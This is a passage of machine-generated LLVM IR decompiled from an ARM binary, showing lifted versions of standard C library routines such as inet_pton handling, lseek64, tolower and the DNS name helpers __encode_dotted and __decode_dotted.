  br i1 %v7_170e8, label %dec_label_pc_170f0, label %dec_label_pc_17108

dec_label_pc_170f0:                               ; preds = %dec_label_pc_170e4
  store i32 10, i32* %r0.global-to-local, align 4
  %v0_170f4 = load i32, i32* @r4, align 4
  %v1_170f4 = inttoptr i32 %v0_170f4 to i32*
  %v2_170f4 = load i32, i32* %v1_170f4, align 4
  store i32 %v2_170f4, i32* %r1.global-to-local, align 4
  store i32 %v0_16fc0, i32* %r2.global-to-local, align 4
  %v3_170fc = inttoptr i32 %v2_170f4 to i8*
  %v4_170fc = call i32 @inet_pton(i32 10, i8* %v3_170fc, i32 %v0_16fc0)
  store i32 %v4_170fc, i32* %r0.global-to-local, align 4
  %v5_17104 = icmp sgt i32 %v4_170fc, 0
  br i1 %v5_17104, label %dec_label_pc_16f5c, label %dec_label_pc_17108

dec_label_pc_17108:                               ; preds = %dec_label_pc_170c8, %dec_label_pc_170e4, %dec_label_pc_170f0
  store i32 2, i32* @sl, align 4
  br label %dec_label_pc_1710c

dec_label_pc_1710c:                               ; preds = %dec_label_pc_170ac, %dec_label_pc_17080, %dec_label_pc_17058, %dec_label_pc_17108, %dec_label_pc_16fb4
  %v0_1710c = load i32, i32* @fp, align 4
  store i32 %v0_1710c, i32* %r0.global-to-local, align 4
  %v0_17110 = load i32, i32* @r8, align 4
  store i32 %v0_17110, i32* %r1.global-to-local, align 4
  store i32 %stack_var_-52.0, i32* %r2.global-to-local, align 4
  %v3_17118 = call i32 @fgets(i32 %v0_1710c, i32 %v0_17110, i32 %stack_var_-52.0)
  store i32 %v3_17118, i32* %r0.global-to-local, align 4
  %v2_1711c = icmp eq i32 %v3_17118, 0
  br i1 %v2_1711c, label %dec_label_pc_17124, label %dec_label_pc_16fcc

dec_label_pc_17124:                               ; preds = %dec_label_pc_1710c, %dec_label_pc_16f5c, %dec_label_pc_16f18
  %v2_17124 = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_17124, i32* %r3.global-to-local, align 4
  %v7_17128 = icmp eq i32 %v2_17124, 1
  br i1 %v7_17128, label %dec_label_pc_17140, label %dec_label_pc_17130

dec_label_pc_17130:                               ; preds = %dec_label_pc_17124
  store i32 %stack_var_-52.0, i32* %r0.global-to-local, align 4
  %v1_17134 = inttoptr i32 %stack_var_-52.0 to i8*
  %v2_17134 = call i32 @__GI_fclose(i8* %v1_17134)
  store i32 %v2_17134, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17140

dec_label_pc_1713c:                               ; preds = %dec_label_pc_16e58, %bb74, %dec_label_pc_16eac, %dec_label_pc_16ea4, %dec_label_pc_16e98, %dec_label_pc_16e84, %dec_label_pc_16e68
  store i32 34, i32* @sl, align 4
  br label %dec_label_pc_17140

dec_label_pc_17140:                               ; preds = %dec_label_pc_17068, %dec_label_pc_17124, %dec_label_pc_17130, %dec_label_pc_16f00, %dec_label_pc_1713c
  %v0_17140 = load i32, i32* @sl, align 4
  store i32 %v0_17140, i32* %r0.global-to-local, align 4
  store i32 %v3_16e28, i32* @r4, align 4
  store i32 %v6_16e28, i32* @r5, align 4
  store i32 %v12_16e28, i32* @r7, align 4
  store i32 %v15_16e28, i32* @r8, align 4
  store i32 %v21_16e28, i32* @sl, align 4
  store i32 %v24_16e28, i32* @fp, align 4
  ret i32 %v0_17140

; uselistorder directives
  uselistorder i32 %v1_17098, { 1, 0 }
  uselistorder i32 %v0_1705c, { 1, 0 }
  uselistorder i32 %v3_16ff823, { 1, 0 }
  uselistorder i32 %v0_16ff820, { 1, 0 }
  uselistorder i32 %v2_16fd4, { 1, 0, 2 }
  uselistorder i32 %stack_var_-52.0, { 1, 0, 3, 2 }
  uselistorder i32 %stack_var_-40.1, { 1, 0 }
  uselistorder i32 %v0_16ed4, { 1, 0 }
  uselistorder i32 %v0_16e98, { 1, 0, 2, 3 }
  uselistorder i32 %v0_16e7c, { 1, 0 }
  uselistorder i32 %v0_16e48, { 1, 0, 2 }
  uselistorder i32 %v0_16e3c, { 0, 2, 1, 3 }
  uselistorder i32 %v1_16e38, { 4, 2, 3, 1, 0 }
  uselistorder i32 %tmp61, { 1, 0, 3, 2 }
  uselistorder i32 %tmp57, { 0, 2, 3, 1 }
  uselistorder i32 %tmp56, { 3, 0, 1, 2 }
  uselistorder i32 %tmp53, { 0, 3, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 1, 11, 17, 12, 13, 14, 15, 16, 0, 18, 19, 2, 3, 4, 5, 6, 7, 8, 9, 10, 20, 21, 22, 23, 24 }
  uselistorder i32* %r2.global-to-local, { 16, 4, 5, 9, 10, 12, 11, 14, 13, 15, 0, 1, 2, 3, 6, 7, 8, 17, 19, 18, 20 }
  uselistorder i32* %r1.global-to-local, { 13, 4, 7, 8, 9, 0, 10, 1, 11, 12, 2, 3, 5, 6, 14 }
  uselistorder i32* %r0.global-to-local, { 0, 5, 1, 22, 21, 11, 6, 13, 12, 14, 15, 18, 16, 17, 20, 19, 2, 3, 4, 7, 8, 9, 10, 23, 25, 24 }
  uselistorder i32 34, { 6, 2, 3, 0, 7, 8, 5, 1, 4 }
  uselistorder i32 (i32, i32, i32)* @fgets, { 3, 1, 0, 2 }
  uselistorder i32 (i8*, i32)* @__GI_strcoll, { 16, 17, 18, 19, 0, 20, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i32 7, { 2, 21, 22, 11, 12, 13, 0, 17, 24, 20, 1, 3, 4, 5, 18, 19, 8, 14, 15, 6, 7, 16, 10, 9, 23 }
  uselistorder i32* @global_var_23df4, { 0, 6, 2, 7, 1, 3, 4, 8, 5, 9 }
  uselistorder i32 35, { 0, 2, 3, 1 }
  uselistorder i32 10, { 3, 4, 38, 5, 6, 39, 40, 41, 42, 43, 30, 14, 29, 7, 44, 1, 45, 46, 47, 48, 12, 15, 35, 16, 36, 17, 18, 19, 0, 31, 32, 20, 27, 28, 37, 9, 21, 13, 33, 34, 11, 10, 2, 49, 22, 8, 24, 25, 23, 26, 50 }
  uselistorder i32 12, { 47, 48, 49, 0, 50, 7, 51, 19, 12, 13, 3, 54, 14, 10, 70, 71, 72, 73, 74, 75, 11, 76, 77, 78, 79, 80, 81, 15, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 5, 4, 41, 42, 43, 16, 20, 46, 63, 21, 22, 64, 65, 66, 1, 23, 67, 8, 68, 9, 24, 2, 69, 17, 55, 56, 57, 58, 82, 6, 44, 52, 53, 25, 26, 27, 28, 29, 30, 45, 59, 60, 61, 18, 62 }
  uselistorder i32* @sb, { 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 1, 2, 24, 25, 26, 27, 28, 29, 30, 31, 32, 3, 4, 33, 34, 35, 36, 37, 38, 5, 6, 7, 8, 9, 10, 0, 11 }
  uselistorder i32 80, { 0, 2, 3, 4, 1, 5 }
  uselistorder i32 48, { 15, 5, 18, 2, 10, 11, 12, 3, 6, 13, 7, 19, 17, 14, 1, 0, 16, 8, 9, 4 }
  uselistorder i32 36, { 11, 12, 13, 15, 16, 17, 18, 4, 1, 14, 0, 8, 9, 10, 2, 3, 5, 6, 7 }
  uselistorder i32 56, { 4, 3, 6, 2, 7, 1, 0, 8, 5 }
  uselistorder i32 44, { 9, 10, 11, 7, 8, 15, 1, 6, 14, 13, 0, 12, 2, 3, 4, 5 }
  uselistorder i32 -48, { 2, 3, 0, 4, 5, 6, 7, 1 }
  uselistorder i32 -32, { 1, 5, 2, 6, 7, 3, 0, 4 }
  uselistorder i32 32, { 62, 63, 64, 0, 65, 66, 42, 74, 35, 75, 30, 31, 27, 51, 36, 52, 53, 45, 46, 4, 3, 6, 5, 8, 7, 1, 28, 69, 67, 68, 54, 19, 55, 2, 37, 56, 57, 58, 59, 60, 20, 61, 43, 44, 70, 71, 72, 73, 76, 38, 47, 39, 29, 48, 49, 50, 10, 9, 21, 32, 40, 22, 12, 11, 14, 13, 23, 16, 15, 24, 25, 18, 17, 26, 33, 34, 41 }
  uselistorder i32* @fp, { 37, 40, 38, 1, 39, 41, 42, 43, 44, 0, 46, 45, 47, 48, 49, 18, 2, 50, 51, 52, 53, 54, 55, 56, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 31, 32, 33, 34, 35, 36, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 108, 109, 107, 102, 103, 104, 105, 106 }
  uselistorder i32* @sl, { 24, 25, 26, 27, 30, 28, 29, 31, 32, 33, 34, 35, 36, 37, 38, 39, 4, 5, 40, 41, 0, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 6, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 2, 7, 8, 9, 10, 11, 12, 13, 1, 14, 15, 16, 17, 18, 3, 19, 20, 21, 22, 23 }
  uselistorder i32* @r8, { 31, 32, 33, 34, 35, 36, 37, 5, 6, 7, 38, 43, 44, 0, 45, 80, 81, 82, 83, 1, 84, 85, 86, 87, 19, 20, 95, 96, 8, 9, 10, 11, 12, 13, 14, 94, 88, 89, 90, 91, 92, 93, 21, 22, 23, 24, 25, 26, 3, 4, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 2, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 27, 28, 29, 30, 39, 40, 41, 42, 15, 16, 17, 18 }
  uselistorder i32* @r7, { 65, 67, 68, 66, 69, 70, 71, 72, 73, 74, 9, 10, 11, 12, 13, 14, 15, 1, 75, 83, 82, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 42, 43, 44, 45, 116, 16, 17, 2, 18, 6, 19, 20, 21, 22, 23, 24, 25, 26, 27, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 46, 47, 48, 49, 28, 29, 30, 31, 84, 3, 85, 86, 4, 5, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 0, 7, 8, 114, 115, 61, 62, 63, 64, 76, 77, 78, 79, 80, 81, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41 }
  uselistorder label %dec_label_pc_17140, { 4, 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1713c, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_1710c, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_17108, { 2, 1, 0 }
  uselistorder label %dec_label_pc_170ac, { 1, 0 }
  uselistorder label %dec_label_pc_17058, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_16ff8.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_17038, { 1, 0 }
  uselistorder label %dec_label_pc_16fb4, { 1, 0 }
  uselistorder label %bb74, { 1, 0 }
  uselistorder label %dec_label_pc_16e68, { 1, 0 }
}

define i32 @__libc_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_17194, label %dec_label_pc_17180

dec_label_pc_17180:                               ; preds = %entry
  %v0_17180 = call i32 @__errno_location()
  %v0_17184 = load i32, i32* %r4.global-to-local, align 4
  %v1_17184 = sub i32 0, %v0_17184
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_1718c = inttoptr i32 %v0_17180 to i32*
  store i32 %v1_17184, i32* %v2_1718c, align 4
  %v0_1719c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1719c

dec_label_pc_17194:                               ; preds = %entry
  %v2_17194 = icmp eq i32 %arg1, 0
  br i1 %v2_17194, label %dec_label_pc_171a8, label %dec_label_pc_1719c

dec_label_pc_1719c:                               ; preds = %dec_label_pc_17194, %dec_label_pc_17180
  %v0_1719c = phi i32 [ %arg1, %dec_label_pc_17194 ], [ %v0_1719c.pre, %dec_label_pc_17180 ]
  br label %dec_label_pc_171ac

dec_label_pc_171a8:                               ; preds = %dec_label_pc_17194
  br label %dec_label_pc_171ac

dec_label_pc_171ac:                               ; preds = %dec_label_pc_1719c, %dec_label_pc_171a8
  %v14_171b0 = phi i32 [ %v0_1719c, %dec_label_pc_1719c ], [ %tmp9, %dec_label_pc_171a8 ]
  ret i32 %v14_171b0

; uselistorder directives
  uselistorder i32 ()* @__errno_location, { 53, 44, 71, 70, 69, 14, 43, 52, 51, 42, 18, 38, 50, 49, 27, 55, 11, 10, 9, 8, 24, 7, 23, 73, 65, 64, 57, 56, 68, 67, 66, 17, 63, 26, 37, 36, 54, 16, 30, 33, 41, 32, 35, 48, 47, 46, 0, 40, 39, 15, 45, 6, 5, 62, 29, 28, 61, 22, 4, 13, 1, 21, 12, 60, 59, 34, 20, 19, 58, 3, 2, 72, 31, 25 }
  uselistorder i32 %arg1, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_171ac, { 1, 0 }
}

define i32 @__GI_tolower(i32 %arg1) local_unnamed_addr {
entry:
  %v1_171bc = icmp slt i32 %arg1, 0
  br i1 %v1_171bc, label %bb, label %bb1

bb:                                               ; preds = %entry
  ret i32 %arg1

bb1:                                              ; preds = %entry
  %v2_171bc = mul i32 %arg1, 2
  %v2_171c8 = load i32, i32* bitcast (i32** @global_var_24130.703 to i32*), align 4
  %v2_171cc = add i32 %v2_171c8, %v2_171bc
  %v3_171d0 = inttoptr i32 %v2_171cc to i8*
  %v4_171d0 = load i8, i8* %v3_171d0, align 1
  %v6_171d0 = zext i8 %v4_171d0 to i32
  %v1_171d4 = add i32 %v2_171cc, 1
  %v2_171d4 = inttoptr i32 %v1_171d4 to i8*
  %v3_171d4 = load i8, i8* %v2_171d4, align 1
  %v4_171d4 = zext i8 %v3_171d4 to i32
  %v3_171d8 = mul nuw i32 %v4_171d4, 16777216
  %v4_171dc = sdiv i32 %v3_171d8, 65536
  %v5_171dc = or i32 %v4_171dc, %v6_171d0
  ret i32 %v5_171dc

; uselistorder directives
  uselistorder i32 %v2_171cc, { 1, 0 }
}

define i32 @__encode_dotted(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_171e8 = load i32, i32* @r4, align 4
  store i32 %v3_171e8, i32* %stack_var_-24, align 4
  %v6_171e8 = load i32, i32* @r5, align 4
  %v9_171e8 = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_171f0 = load i32, i32* @r1, align 4
  store i32 %v0_171f0, i32* @r6, align 4
  %v0_171f4 = load i32, i32* @r2, align 4
  store i32 %v0_171f4, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1725c19 = icmp slt i8* %arg1, null
  store i1 %v1_1725c19, i1* %cpsr_n.global-to-local, align 1
  %v2_1725c20 = icmp eq i8* %arg1, null
  store i1 %v2_1725c20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1725c20, label %dec_label_pc_17274, label %dec_label_pc_17268

dec_label_pc_17200:                               ; preds = %dec_label_pc_17268
  %v2_17200 = call i32 @__GI_strchr(i32 %v0_1720021, i32 46)
  store i32 %v2_17200, i32* @r5, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_17204 = icmp slt i32 %v2_17200, 0
  store i1 %v1_17204, i1* %cpsr_n.global-to-local, align 1
  %v2_17204 = icmp eq i32 %v2_17200, 0
  store i1 %v2_17204, i1* %cpsr_z.global-to-local, align 1
  %v0_17208 = load i32, i32* @r4, align 4
  %v2_17208 = sub i32 %v2_17200, %v0_17208
  store i32 %v2_17208, i32* @ip, align 4
  store i32 %v0_17208, i32* %r0.global-to-local, align 4
  br i1 %v2_17204, label %dec_label_pc_17214, label %dec_label_pc_1721c

dec_label_pc_17214:                               ; preds = %dec_label_pc_17200
  %v1_1720c = inttoptr i32 %v0_17208 to i8*
  %v3_17214 = call i32 @strlen(i8* %v1_1720c)
  store i32 %v3_17214, i32* %r0.global-to-local, align 4
  %sext = mul i32 %v3_17214, 16777216
  %v1_17218 = sdiv i32 %sext, 16777216
  store i32 %v1_17218, i32* @ip, align 4
  %v0_17228.pre = load i32, i32* @r4, align 4
  %v0_17238.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1721c

dec_label_pc_1721c:                               ; preds = %dec_label_pc_17200, %dec_label_pc_17214
  %v0_17238 = phi i32 [ %v2_17200, %dec_label_pc_17200 ], [ %v0_17238.pre, %dec_label_pc_17214 ]
  %v0_17228 = phi i32 [ %v0_17208, %dec_label_pc_17200 ], [ %v0_17228.pre, %dec_label_pc_17214 ]
  %v0_17248 = phi i32 [ %v2_17208, %dec_label_pc_17200 ], [ %v1_17218, %dec_label_pc_17214 ]
  %v0_1721c = load i32, i32* %r7.global-to-local, align 4
  %v1_1721c = add i32 %v0_1721c, 1
  store i32 %v1_1721c, i32* @lr, align 4
  %v1_17220 = load i32, i32* %r8.global-to-local, align 4
  %v2_17220 = sub i32 %v1_17220, %v0_1721c
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_17224 = icmp slt i32 %v0_17248, 0
  store i1 %v1_17224, i1* %cpsr_n.global-to-local, align 1
  %v2_17224 = icmp eq i32 %v0_17248, 0
  store i1 %v2_17224, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_17228, i32* @r1, align 4
  %v0_1722c = load i32, i32* @r6, align 4
  %v2_1722c = add i32 %v0_1722c, %v1_1721c
  store i32 %v2_1722c, i32* @r0, align 4
  store i32 %v0_17248, i32* @r2, align 4
  %v1_17234 = add i32 %v2_17220, -1
  %v1_17238 = add i32 %v0_17238, 1
  store i32 %v1_17238, i32* @r4, align 4
  br i1 %v2_17224, label %.loopexit, label %dec_label_pc_17240

dec_label_pc_17240:                               ; preds = %dec_label_pc_1721c
  %v2_17240 = sub i32 %v0_17248, %v1_17234
  %v3_17240 = icmp ult i32 %v0_17248, %v1_17234
  %v4_17240 = xor i32 %v1_17234, %v0_17248
  %v5_17240 = xor i32 %v2_17240, %v0_17248
  %v6_17240 = and i32 %v5_17240, %v4_17240
  %v7_17240 = icmp slt i32 %v6_17240, 0
  store i1 %v7_17240, i1* %cpsr_v.global-to-local, align 1
  %v8_17240 = icmp slt i32 %v2_17240, 0
  store i1 %v8_17240, i1* %cpsr_n.global-to-local, align 1
  %v9_17240 = icmp eq i32 %v0_17248, %v1_17234
  store i1 %v9_17240, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_17240, label %dec_label_pc_17248, label %.loopexit

dec_label_pc_17248:                               ; preds = %dec_label_pc_17240
  %v1_17248 = trunc i32 %v0_17248 to i8
  %v4_17248 = add i32 %v0_1722c, %v0_1721c
  %v5_17248 = inttoptr i32 %v4_17248 to i8*
  store i8 %v1_17248, i8* %v5_17248, align 1
  %v0_1724c = load i32, i32* @lr, align 4
  %v1_1724c = load i32, i32* @ip, align 4
  %v2_1724c = add i32 %v1_1724c, %v0_1724c
  store i32 %v2_1724c, i32* %r7.global-to-local, align 4
  %v0_17250 = call i32 @memcpy()
  store i32 %v0_17250, i32* %r0.global-to-local, align 4
  %v0_17254 = load i32, i32* @r5, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_17254 = icmp slt i32 %v0_17254, 0
  store i1 %v1_17254, i1* %cpsr_n.global-to-local, align 1
  %v2_17254 = icmp eq i32 %v0_17254, 0
  store i1 %v2_17254, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17254, label %dec_label_pc_17274, label %dec_label_pc_17248.dec_label_pc_1725c_crit_edge

dec_label_pc_17248.dec_label_pc_1725c_crit_edge:  ; preds = %dec_label_pc_17248
  %v0_1725c.pre = load i32, i32* @r4, align 4
  store i32 %v0_1725c.pre, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1725c = icmp slt i32 %v0_1725c.pre, 0
  store i1 %v1_1725c, i1* %cpsr_n.global-to-local, align 1
  %v2_1725c = icmp eq i32 %v0_1725c.pre, 0
  store i1 %v2_1725c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1725c, label %dec_label_pc_17274, label %dec_label_pc_17268

dec_label_pc_17268:                               ; preds = %entry, %dec_label_pc_17248.dec_label_pc_1725c_crit_edge
  %v0_1720021 = phi i32 [ %v0_1725c.pre, %dec_label_pc_17248.dec_label_pc_1725c_crit_edge ], [ %tmp, %entry ]
  %v1_17268 = inttoptr i32 %v0_1720021 to i8*
  %v2_17268 = load i8, i8* %v1_17268, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1726c = icmp eq i8 %v2_17268, 0
  store i1 %v2_1726c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1726c, label %dec_label_pc_17274, label %dec_label_pc_17200

dec_label_pc_17274:                               ; preds = %dec_label_pc_17248.dec_label_pc_1725c_crit_edge, %dec_label_pc_17248, %dec_label_pc_17268, %entry
  %v0_17274 = load i32, i32* %r8.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_17274 = icmp slt i32 %v0_17274, 0
  store i1 %v1_17274, i1* %cpsr_n.global-to-local, align 1
  %v2_17274 = icmp eq i32 %v0_17274, 0
  store i1 %v2_17274, i1* %cpsr_z.global-to-local, align 1
  %tmp16 = icmp slt i32 %v0_17274, 1
  br i1 %tmp16, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_17274
  %v5_1727c = load i32, i32* %r7.global-to-local, align 4
  %v6_1727c = add i32 %v5_1727c, 1
  store i32 %v6_1727c, i32* %r0.global-to-local, align 4
  %v7_17280 = load i32, i32* @r6, align 4
  %v9_17280 = add i32 %v7_17280, %v5_1727c
  %v10_17280 = inttoptr i32 %v9_17280 to i8*
  store i8 0, i8* %v10_17280, align 1
  %v0_17284.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_17284.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_17284.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_17274, %bb
  %v2_17284 = phi i1 [ %v2_17284.pre, %bb ], [ false, %dec_label_pc_17274 ]
  %v1_17284 = phi i1 [ %v1_17284.pre, %bb ], [ %v1_17274, %dec_label_pc_17274 ]
  %v0_17284 = phi i1 [ %v0_17284.pre, %bb ], [ %v2_17274, %dec_label_pc_17274 ]
  %v3_17284 = xor i1 %v2_17284, %v1_17284
  %v4_17284 = or i1 %v0_17284, %v3_17284
  br i1 %v4_17284, label %.loopexit, label %bb18

bb18:                                             ; preds = %bb17
  %v7_17284 = load i32, i32* %stack_var_-24, align 4
  store i32 %v7_17284, i32* @r4, align 4
  store i32 %v6_171e8, i32* @r5, align 4
  store i32 %v9_171e8, i32* @r6, align 4
  %v25_17284 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v25_17284

.loopexit:                                        ; preds = %dec_label_pc_17240, %dec_label_pc_1721c, %bb17
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1728c = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_1728c, i32* @r4, align 4
  store i32 %v6_171e8, i32* @r5, align 4
  store i32 %v9_171e8, i32* @r6, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v0_17274, { 0, 2, 1 }
  uselistorder i32 %v0_1725c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_17254, { 1, 0 }
  uselistorder i32 %v2_17240, { 1, 0 }
  uselistorder i32 %v1_17234, { 2, 0, 3, 1 }
  uselistorder i32 %v0_17248, { 2, 4, 0, 1, 5, 3, 6, 7, 8 }
  uselistorder i32 %v1_17218, { 1, 0 }
  uselistorder i32 %v0_17208, { 0, 2, 1, 3 }
  uselistorder i1 %v2_1725c20, { 1, 0 }
  uselistorder i32 %v9_171e8, { 1, 0 }
  uselistorder i32 %v6_171e8, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 1, 7, 2, 6, 3, 5, 4, 8, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 6, 7, 2, 3, 4, 5, 8 }
  uselistorder i1* %cpsr_v.global-to-local, { 0, 1, 6, 7, 2, 3, 4, 5, 8 }
  uselistorder i1* %cpsr_n.global-to-local, { 0, 1, 6, 7, 2, 3, 4, 5, 8 }
  uselistorder i32 16777216, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26, 27, 28, 29, 30, 31, 32, 33, 36, 34, 37, 35, 40, 38, 41, 39, 43, 42, 45, 44, 47, 46, 49, 48 }
  uselistorder i32 (i8*)* @strlen, { 9, 21, 20, 8, 5, 13, 12, 11, 22, 19, 18, 17, 15, 16, 14, 7, 6, 10, 25, 24, 23, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_strchr, { 2, 1, 0, 8, 7, 6, 5, 4, 3 }
  uselistorder i32 46, { 0, 3, 4, 1, 2 }
  uselistorder i32* @r6, { 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 11, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 1, 0, 18, 19, 20, 21, 22, 137, 2, 138, 139, 140, 147, 148, 149, 150, 54, 3, 55, 56, 57, 151, 155, 154, 156, 157, 158, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 4, 71, 72, 73, 74, 75, 76, 77, 210, 215, 28, 29, 23, 24, 25, 103, 104, 105, 106, 26, 27, 30, 31, 32, 33, 34, 35, 36, 37, 207, 208, 209, 187, 188, 5, 189, 190, 191, 192, 193, 194, 204, 13, 205, 206, 6, 78, 195, 196, 197, 198, 199, 200, 141, 142, 143, 144, 145, 146, 79, 80, 81, 82, 83, 84, 85, 86, 159, 160, 161, 162, 163, 7, 12, 164, 38, 8, 39, 40, 165, 9, 166, 167, 87, 88, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 15, 16, 17, 89, 90, 91, 92, 211, 212, 213, 214, 14, 168, 169, 170, 171, 10, 172, 173, 174, 175, 152, 153, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 201, 202, 203 }
  uselistorder label %.loopexit, { 2, 0, 1 }
  uselistorder label %bb17, { 1, 0 }
  uselistorder label %dec_label_pc_17274, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_17268, { 1, 0 }
  uselistorder label %dec_label_pc_1721c, { 1, 0 }
}

define i32 @__decode_dotted() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_17290 = load i32, i32* @r4, align 4
  %v6_17290 = load i32, i32* @r5, align 4
  %v0_17294 = load i32, i32* @r0, align 4
  store i32 %v0_17294, i32* %sl.global-to-local, align 4
  %v2_17294 = icmp eq i32 %v0_17294, 0
  br i1 %v2_17294, label %.thread16, label %dec_label_pc_17334.preheader

.thread16:                                        ; preds = %entry
  %v0_172a01 = load i32, i32* @r2, align 4
  store i32 %v0_172a01, i32* %sb.global-to-local, align 4
  %v0_172a42 = load i32, i32* @r3, align 4
  store i32 %v0_172a42, i32* %stack_var_-40, align 4
  br label %dec_label_pc_17354

dec_label_pc_17334.preheader:                     ; preds = %entry
  store i32 0, i32* %r8.global-to-local, align 4
  %v0_172a0 = load i32, i32* @r2, align 4
  store i32 %v0_172a0, i32* %sb.global-to-local, align 4
  %v0_172a4 = load i32, i32* @r3, align 4
  store i32 %v0_172a4, i32* %stack_var_-40, align 4
  store i32 1, i32* %fp.global-to-local, align 4
  %v1_173343952 = load i32, i32* @r1, align 4
  %v2_173344053 = add i32 %v1_173343952, %v0_17294
  %v3_173344154 = inttoptr i32 %v2_173344053 to i8*
  %v4_173344255 = load i8, i8* %v3_173344154, align 1
  %v6_173344356 = zext i8 %v4_173344255 to i32
  store i32 %v6_173344356, i32* @r4, align 4
  %v2_173384457 = icmp eq i8 %v4_173344255, 0
  br i1 %v2_173384457, label %bb35, label %dec_label_pc_172b8.lr.ph

dec_label_pc_172b8:                               ; preds = %dec_label_pc_172b8.lr.ph, %bb30
  %v2_1734050 = phi i1 [ %v2_173404663, %dec_label_pc_172b8.lr.ph ], [ true, %bb30 ]
